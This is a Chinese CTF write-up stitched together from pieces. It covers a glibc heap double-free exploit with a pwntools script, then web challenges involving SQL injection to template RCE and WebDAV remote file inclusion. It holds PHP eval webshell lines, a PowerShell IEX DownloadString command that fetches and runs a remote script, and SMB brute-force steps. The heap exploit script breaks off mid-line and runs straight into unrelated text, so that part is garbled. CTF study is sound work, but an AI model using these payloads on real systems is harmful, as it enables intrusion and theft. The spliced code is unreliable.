          }
      }
    #endif
题目就只有`add`和`dele`功能，`dele`没清空指针，但是由于有这个`check`在，有点难受，而且只能`add`18次,想了很久很久，在快结束的前几个小时试了下功能3就是退出那个函数，发现报错了（堆块重叠了导致报错），报的是`malloc_consolidate`的错，瞬间觉得有希望了，原因是
    void init_()
    {
      void *ptr; // ST08_8
      setbuf(stdout, 0LL);
      setbuf(stderr, 0LL);
      alarm(0x1Eu);
      ptr = malloc(0x1000uLL);
      printf("good present for African friends:0x%x\n", (unsigned int)(((unsigned __int16)ptr & 0xFF00) >> 8));
      free(ptr);
    }
这里开始的初始话没有`setbuf(stdin,0)`，于是乎在`getchar`的时候会再堆上申请一个`0x1000`大小的缓冲区，这样就不用浪费`add`的次数去申请一个大堆块，再配合题目的`dele`函数，就可以在限定次数下完成利用
先是
    for i in range(8):
            add(0x78,"\x00"*0x78)
        for i in range(7):
            dele(i)
        dele(7) #fastbin
        cmd(3)
        p.recvuntil("sure?")
        p.send("0")
这样`chunk7`被`malloc_consolidate`合并，然后在`add(0x68,"\x00"*0x68)`一下，以防释放那个缓冲区的时候和`top_chunk`合并
    wndbg> telescope 0x5625febf8060 18
    00:0000│   0x5625febf8060 —▸ 0x5625fec6a260 ◂— 0x0
    01:0008│   0x5625febf8068 —▸ 0x5625fec6a2e0 —▸ 0x5625fec6a260 ◂— 0x0
    02:0010│   0x5625febf8070 —▸ 0x5625fec6a360 —▸ 0x5625fec6a2e0 —▸ 0x5625fec6a260 ◂— 0x0
    03:0018│   0x5625febf8078 —▸ 0x5625fec6a3e0 —▸ 0x5625fec6a360 —▸ 0x5625fec6a2e0 —▸ 0x5625fec6a260 ◂— ...
    04:0020│   0x5625febf8080 —▸ 0x5625fec6a460 —▸ 0x5625fec6a3e0 —▸ 0x5625fec6a360 —▸ 0x5625fec6a2e0 ◂— ...
    05:0028│   0x5625febf8088 —▸ 0x5625fec6a4e0 —▸ 0x5625fec6a460 —▸ 0x5625fec6a3e0 —▸ 0x5625fec6a360 ◂— ...
    06:0030│   0x5625febf8090 —▸ 0x5625fec6a560 —▸ 0x5625fec6a4e0 —▸ 0x5625fec6a460 —▸ 0x5625fec6a3e0 ◂— ...
    07:0038│   0x5625febf8098 —▸ 0x5625fec6a5e0 ◂— 0x30 /* '0' */
    08:0040│   0x5625febf80a0 —▸ 0x5625fec6b5f0 ◂— 0x0
    09:0048│   0x5625febf80a8 ◂— 0x0
    ... ↓
    pwndbg> telescope 0x5625fec6a5d0
    00:0000│   0x5625fec6a5d0 ◂— 0x0
    01:0008│   0x5625fec6a5d8 ◂— 0x1011
    02:0010│   0x5625fec6a5e0 ◂— 0x30 /* '0' */
    03:0018│   0x5625fec6a5e8 ◂— 0x0
    ... ↓
我们可以看到`chunk7`和`getchar`申请的缓冲区重叠，也正是如此，我们可以利用`getchar`来修改`chunk7`的`bk`指针,然后就是
    dele(7)
        add(0x68,"\x00"*0x68)
        dele(7)
        cmd(3)
        p.recvuntil("sure?")
        p.send("\x00"*0xe)
        dele(7)
可以看到成功 **double free** ，堆上也有了`libc`的指针
    tcachebins
    0x70 [  2]: 0x55e3221f45e0 ◂— 0x55e3221f45e0
    0x80 [  7]: 0x55e3221f4560 —▸ 0x55e3221f44e0 —▸ 0x55e3221f4460 —▸ 0x55e3221f43e0 —▸ 0x55e3221f4360 —▸ 0x55e3221f42e0 —▸ 0x55e3221f4260 ◂— 0x0
    unsortedbin
    all: 0x55e3221f4640 —▸ 0x7f6ba8af9ca0 (main_arena+96) ◂— 0x55e3221f4640
后面就是泄露`libc`和`getshell`了，要注意`add`的次数就好,泄露的时候还是有点看脸,不过1/16的几率多跑几次就好
exp为：
    from pwn import *
    def cmd(c):
        p.recvuntil("3.exit")
        p.sendline(str(c))
    def add(sz,content):
        cmd(1)
        p.recvuntil("size:")
        p.sendline(str(sz))
        p.recvuntil("content:")
        p.send(content)
    def dele(idx):
        cmd(2)
        p.recvuntil("index:")
        p.sendline(str(idx))
    def main(host,port=20508):
        global p
        if host:
            p = remote(host,port)
        else:
            # p = process("./new_heap")
            p = process("./new_heap",env={"LD_PRELOAD":"./libc.so.6"})
            gdb.attach(p)
        p.recvuntil("friends:")
        heap = (int(p.recvuntil("\n",drop=True),16)>>4) 平台进不去，之前忘记截图，就只写一下大致思路吧。
## easyweb
题目很简洁，有登录注册，还有个莫名其妙的上传，对文件没有任何限制，但是直接传到 /tmp 下了，而且过滤了 `..`。
Profile 处有显示出用户名，可能存在二次注入。另外，渲染用的是 smarty。
> Hi, wywwzjj, hope you have a good experience in this ctf game  
>  you must get a RCE Bug in this challenge
可看到注册时用户名、密码都没有经过任何处理，取出来时有简单过滤，很好绕。
    jkl2' uni{on se{lect 233#
要想打出模板注入还是麻烦点，过滤掉了 `{}`，这里卡了一下。
既然都能执行 SQL，为何不利用一下呢？
    uni{on sel{lect 0x7b7b7068707d7d6576616c28245f4745545b315d293b7b7b2f7068707d7d#
看到 flag 还是震惊了一下，pop chain？？？
## fakeonelinephp
随手一试：
    Warning: include(): data:// wrapper is disabled in the server configuration by allow_url_include=0 in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1
    Warning: include(data://...@<?php): failed to open stream: no suitable wrapper could be found in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1
    Warning: include(): Failed opening 'data://...@<?php' for inclusion (include_path='.;C:\Users\Public\Videos;\c:\php\includes;c:\php\pear;') in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1
扫目录看到了 .git，以及 /webdav，想起曾经有人提过 webdav 打 RFI 的姿势。
    docker run -v ~/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav
到这一步就能 RCE 了，不过 flag 还在里头呢。
    Windows NT 172_19_97_4 10.0 build 14393 (Windows Server 2016) AMD64
包含 shell 的时候遇到一点麻烦，估计是 Defender 之类的安全软件在作祟，干掉了 $_POST[] 这种形式的，那就
    @<?php eval($_POST{1});
    @<?php eval(base64_decode(编码一个eval));
socks5 代理一直出不来，直接搞个 powshell 进行了一下端口扫描。
    powershell IEX (New-Object System.Net.Webclient).DownloadString('http://vps/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 172.19.97.8
得到结果：
    Hostname      : 172.19.97.8
    alive         : True
    openPorts     : {3389, 445, 139, 135}
    closedPorts   : {443, 23, 646, 3306...}
    filteredPorts : {80}
    finishTime    : 11/24/2019 11:48:02 AM
队友尝试爆了下 3389，没成功，我搭了下车，拿其他师傅传的 hydra 直接爆 445 居然成功了。
结合之前的提示，然后就是利用 smb。
    net use \\172.19.97.8\C$
    type \\172.19.97.8\C$\Users\Administrator\Desktop\flag.txt